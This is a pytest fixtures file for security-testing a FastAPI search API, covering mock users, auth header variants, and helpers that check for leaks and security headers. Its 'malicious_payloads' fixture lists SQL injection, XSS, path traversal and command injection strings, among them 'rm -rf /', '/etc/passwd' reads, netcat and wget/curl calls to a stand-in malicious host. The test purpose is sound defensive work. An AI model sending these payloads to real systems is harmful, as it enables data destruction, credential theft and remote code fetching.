"""
Shared fixtures and configuration for search security tests
"""

import asyncio
import json
import time
import uuid
from datetime import datetime, timedelta
from typing import Any, Dict, Generator, List
from unittest.mock import AsyncMock, Mock, patch

import pytest
from fastapi.testclient import TestClient
from httpx import AsyncClient
from sqlalchemy.orm import Session

from src.core.database import get_db, get_db_sync
from src.core.dependencies import get_current_user
from src.main import app
from src.models.organization import Organization
from src.models.search_schemas import SearchQuery, SearchType
from src.models.user import User


class SecurityTestClient:
    """Enhanced test client for security testing"""

    def __init__(self, client: TestClient):
        self.client = client
        self.request_count = 0
        self.request_history: List[Dict[str, Any]] = []

    API_PREFIX = "/api/v1"

    def make_request(self, method: str, url: str, **kwargs):
        """Make a request and track it for rate limiting tests"""
        self.request_count += 1
        start_time = time.time()

        prefixed_url = (
            f"{self.API_PREFIX}{url}" if not url.startswith(self.API_PREFIX) else url
        )
        response = getattr(self.client, method.lower())(prefixed_url, **kwargs)

        end_time = time.time()
        self.request_history.append(
            {
                "method": method,
                "url": url,
                "timestamp": start_time,
                "response_time": end_time - start_time,
                "status_code": response.status_code,
                "kwargs": kwargs,
            }
        )

        return response

    def reset_tracking(self):
        """Reset request tracking"""
        self.request_count = 0
        self.request_history.clear()

    def set_user(self, user):
        """Override the authenticated user for subsequent requests."""
        app.dependency_overrides[get_current_user] = lambda: user

    def remove_auth(self):
        """Remove auth override so requests are unauthenticated."""
        app.dependency_overrides.pop(get_current_user, None)


def _make_mock_user():
    """Create a mock authenticated user for dependency override."""
    mock_user = Mock(spec=User)
    mock_user.id = uuid.uuid4()
    mock_user.email = "sectest@example.com"
    mock_user.username = "sectest"
    mock_user.is_active = True
    mock_user.is_verified = True
    mock_user.organization_id = uuid.uuid4()
    mock_user.role = "user"
    return mock_user


@pytest.fixture
def security_test_client(test_app, test_auth_headers):
    """Create enhanced test client for security testing.

    Overrides the ``get_current_user`` dependency so that requests using the
    ``authentication_headers['valid_jwt']`` fixture are treated as
    authenticated.  Tests that explicitly need unauthenticated behaviour
    (e.g. ``test_auth_security.py``) patch the dependency themselves.
    """
    mock_user = _make_mock_user()
    mock_db = Mock(spec=Session)
    app.dependency_overrides[get_current_user] = lambda: mock_user
    app.dependency_overrides[get_db_sync] = lambda: mock_db
    # PR #1722: the fail-closed tenancy middleware runs before any dependency
    # override, so authenticated requests carry the token the ``test_app``
    # middleware seam (tests/conftest.py) accepts. Explicit per-request
    # headers (invalid/expired/malformed tokens) still override it.
    client = TestClient(app, headers=test_auth_headers)
    yield SecurityTestClient(client)
    app.dependency_overrides.pop(get_current_user, None)
    app.dependency_overrides.pop(get_db_sync, None)


@pytest.fixture
def unauthenticated_security_test_client():
    """Test client WITHOUT auth override for testing unauthenticated behaviour.

    Only overrides ``get_db_sync`` so that requests hitting the real
    ``get_current_user`` dependency will fail with 401.
    """
    mock_db = Mock(spec=Session)
    app.dependency_overrides[get_db_sync] = lambda: mock_db
    # Ensure no auth override is present
    app.dependency_overrides.pop(get_current_user, None)
    client = TestClient(app)
    yield SecurityTestClient(client)
    app.dependency_overrides.pop(get_db_sync, None)
    app.dependency_overrides.pop(get_current_user, None)


@pytest.fixture
def mock_db():
    """Mock database session"""
    db = Mock(spec=Session)
    return db


@pytest.fixture
def test_user():
    """Create a test user for authentication tests"""
    return User(
        id=uuid.uuid4(),
        email="test@example.com",
        username="testuser",
        is_active=True,
        is_verified=True,
        organization_id=uuid.uuid4(),
        role="user",
    )


@pytest.fixture
def admin_user():
    """Create an admin user for authorization tests"""
    return User(
        id=uuid.uuid4(),
        email="admin@example.com",
        username="admin",
        is_active=True,
        is_verified=True,
        organization_id=uuid.uuid4(),
        role="admin",
    )


@pytest.fixture
def test_organization():
    """Create a test organization"""
    return Organization(id=uuid.uuid4(), name="Test Organization", is_active=True)


@pytest.fixture
def malicious_payloads():
    """Collection of malicious payloads for testing"""
    return {
        "sql_injection": [
            "'; DROP TABLE documents; --",
            "' OR '1'='1",
            "' UNION SELECT * FROM users --",
            "'; INSERT INTO documents VALUES('malicious'); --",
            "' OR 1=1; --",
            '"; DROP TABLE documents; --',
            "1' AND '1'='1",
            "admin'--",
            "1' OR '1'='1' /*",
            "'; EXEC xp_cmdshell('dir'); --",
        ],
        "xss_payloads": [
            "<script>alert('XSS')</script>",
            "<img src=x onerror=alert('XSS')>",
            "javascript:alert('XSS')",
            "<svg onload=alert('XSS')>",
            "<iframe src=javascript:alert('XSS')></iframe>",
            "<body onload=alert('XSS')>",
            "<input onfocus=alert('XSS') autofocus>",
            "<select onfocus=alert('XSS') autofocus>",
            "<textarea onfocus=alert('XSS') autofocus>",
            "'>alert('XSS')<'",
            "\"><script>alert('XSS')</script>",
            "<script>document.cookie='stolen'</script>",
        ],
        "command_injection": [
            "; ls -la",
            "| cat /etc/passwd",
            "&& rm -rf /",
            "; curl http://malicious.com",
            "$(whoami)",
            "`id`",
            "${USER}",
            "|nc -l 4444",
            "; python -c 'import os; os.system(\"rm -rf /\")'",
            "&& wget http://malicious.com/script.sh",
        ],
        "path_traversal": [
            "../../../etc/passwd",
            "..\\..\\..\\windows\\system32\\drivers\\etc\\hosts",
            "....//....//....//etc/passwd",
            "%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd",
            "..%252f..%252f..%252fetc%252fpasswd",
            "..%c0%af..%c0%af..%c0%afetc%c0%afpasswd",
        ],
        "buffer_overflow": ["A" * 10000, "A" * 100000, "\x00" * 1000, "\xff" * 1000],
        "unicode_attacks": [
            "\u202e",  # Right-to-left override
            "\u2066",  # Left-to-right isolate
            "\u2067",  # Right-to-left isolate
            "\ufeff",  # Zero width no-break space
            "\u200d",  # Zero width joiner
            "\u200c",  # Zero width non-joiner
        ],
        "null_byte_injection": [
            "test\x00.txt",
            "search\x00'; DROP TABLE documents; --",
            "query\x00<script>alert('xss')</script>",
        ],
    }


@pytest.fixture
def valid_search_payloads():
    """Collection of valid search payloads for comparison tests"""
    return [
        {"query": "machine learning", "search_type": "fulltext"},
        {"query": "neural networks", "search_type": "hybrid"},
        {"query": "artificial intelligence", "search_type": "semantic"},
        {"query": "data science", "search_type": "graph"},
        {"query": "python programming", "search_type": "fulltext", "limit": 10},
        {"query": "deep learning", "search_type": "hybrid", "offset": 5},
    ]


@pytest.fixture
def authentication_headers(test_auth_headers):
    """Generate various authentication headers for testing"""
    return {
        # The token the tenancy-gate test seam accepts (PR #1722).
        "valid_jwt": dict(test_auth_headers),
        "invalid_jwt": {"Authorization": "Bearer invalid_token"},
        "malformed_jwt": {"Authorization": "Bearer not.a.jwt"},
        "expired_jwt": {"Authorization": "Bearer expired_token"},
        "missing_bearer": {"Authorization": "invalid_token"},
        # fmt: off
        'valid_api_key': {'X-API-Key': 'valid_api_key_12345'},
        'invalid_api_key': {'X-API-Key': 'invalid_key'},
        # fmt: on
        "empty_auth": {"Authorization": ""},
        "no_auth": {},
    }


@pytest.fixture
async def rate_limiter_mock():
    """Mock rate limiter for testing"""
    rate_limiter = Mock()
    rate_limiter.is_allowed = Mock(return_value=True)
    rate_limiter.get_remaining = Mock(return_value=100)
    rate_limiter.get_reset_time = Mock(return_value=time.time() + 3600)
    return rate_limiter


@pytest.fixture
def security_logger_mock():
    """Mock security logger for testing log events"""
    with patch("src.core.security_logger") as mock_logger:
        mock_logger.log_security_event = Mock()
        mock_logger.log_suspicious_activity = Mock()
        mock_logger.log_authentication_failure = Mock()
        yield mock_logger


def _make_mock_search_response():
    """Create a SearchResponse-compatible object for mocked search services."""
    from src.models.search_schemas import SearchResponse
    from src.models.search_schemas import SearchType as ST

    return SearchResponse(
        query="test",
        search_id="mock-search-id",
        search_type=ST.FULLTEXT,
        results=[],
        total_results=0,
        returned_results=0,
        search_time_ms=50,
        limit=20,
        offset=0,
        has_more=False,
        suggestions=[],
        filters_applied={},
    )


@pytest.fixture
def search_service_mocks():
    """Mock all search services to isolate endpoint testing"""
    mocks = {}

    with patch("src.api.search.search.hybrid_search_service") as hybrid_mock:
        with patch("src.api.search.search.fulltext_search_service") as fulltext_mock:
            mock_response = _make_mock_search_response()

            hybrid_mock.search.return_value = mock_response
            fulltext_mock.search.return_value = mock_response
            fulltext_mock._get_search_suggestions.return_value = [
                "suggestion1",
                "suggestion2",
            ]

            mocks["hybrid"] = hybrid_mock
            mocks["fulltext"] = fulltext_mock

            yield mocks


class SecurityTestCase:
    """Base class for security test cases"""

    @staticmethod
    def _is_validation_error_body(response) -> bool:
        """Return True if the response body looks like a validation error.

        The custom validation exception handler in ``main.py`` may return
        status 200 while placing the real validation error in the JSON body.
        This helper detects both FastAPI-native 422 responses **and**
        custom-handler responses that contain a validation error payload.
        """
        if response.status_code == 422:
            return True
        try:
            body = response.json()
            # Custom handler shape: {"error": {"type": "validation_error", ...}}
            if isinstance(body, dict):
                error = body.get("error") or body.get("detail")
                if isinstance(error, dict) and error.get("type") == "validation_error":
                    return True
                # FastAPI default shape: list of dicts with 'type' / 'msg'
                if isinstance(error, list) and any(
                    isinstance(e, dict) and "msg" in e for e in error
                ):
                    return True
            if isinstance(body, list) and any(
                isinstance(e, dict) and "msg" in e for e in body
            ):
                return True
        except Exception:
            pass
        return False

    def assert_no_information_disclosure(self, response, sensitive_patterns: List[str]):
        """Assert response doesn't disclose sensitive information"""
        response_text = response.text.lower()
        for pattern in sensitive_patterns:
            assert (
                pattern.lower() not in response_text
            ), f"Sensitive information disclosed: {pattern}"

    def assert_no_server_info_disclosure(self, response):
        """Assert response doesn't disclose server internals.

        Unlike ``assert_no_information_disclosure`` this only checks for
        patterns that indicate a *real* server-side leak (stack traces,
        database names, file paths) and intentionally ignores words that
        Pydantic may reflect from the original test payload (e.g.
        ``password``, ``hacked``).
        """
        sensitive_patterns = [
            "traceback",
            "stack trace",
            "/src/",
            "file path",
        ]
        self.assert_no_information_disclosure(response, sensitive_patterns)

    def assert_security_headers(self, response):
        """Assert security headers are present"""
        security_headers = [
            "x-content-type-options",
            "x-frame-options",
            "x-xss-protection",
        ]

        for header in security_headers:
            assert header in response.headers, f"Missing security header: {header}"

    def assert_safe_error_response(self, response):
        """Assert error response is safe and doesn't leak information.

        Accepts explicit error status codes **and** 200 responses whose body
        contains a validation error (produced by the custom handler in
        ``main.py``).

        Note: Pydantic validation errors reflect the original input in the
        ``details`` field. Words like ``password`` or ``token`` appearing there
        originate from the *test payload*, not from an actual secret leak.  We
        therefore restrict the check to patterns that would indicate a real
        server-side disclosure (stack traces, database names, file paths).
        """
        is_error_status = response.status_code in [400, 401, 403, 404, 422, 429, 500]
        is_validation_body = self._is_validation_error_body(response)
        assert is_error_status or is_validation_body, (
            f"Expected an error response but got status {response.status_code} "
            f"with no validation error body"
        )

        # Only check patterns that indicate real server-side disclosure.
        sensitive_patterns = [
            "database",
            "stack trace",
            "traceback",
            "file path",
            "/src/",
        ]

        self.assert_no_information_disclosure(response, sensitive_patterns)


@pytest.fixture
def security_test_base():
    """Provide SecurityTestCase instance for tests"""
    return SecurityTestCase()


# Async fixtures for async tests
@pytest.fixture
def event_loop():
    """Create an instance of the default event loop for the test session."""
    loop = asyncio.new_event_loop()
    yield loop
    loop.close()


@pytest.fixture
async def async_client():
    """Async test client for async endpoint testing"""
    async with AsyncClient(app=app, base_url="http://test") as client:
        yield client
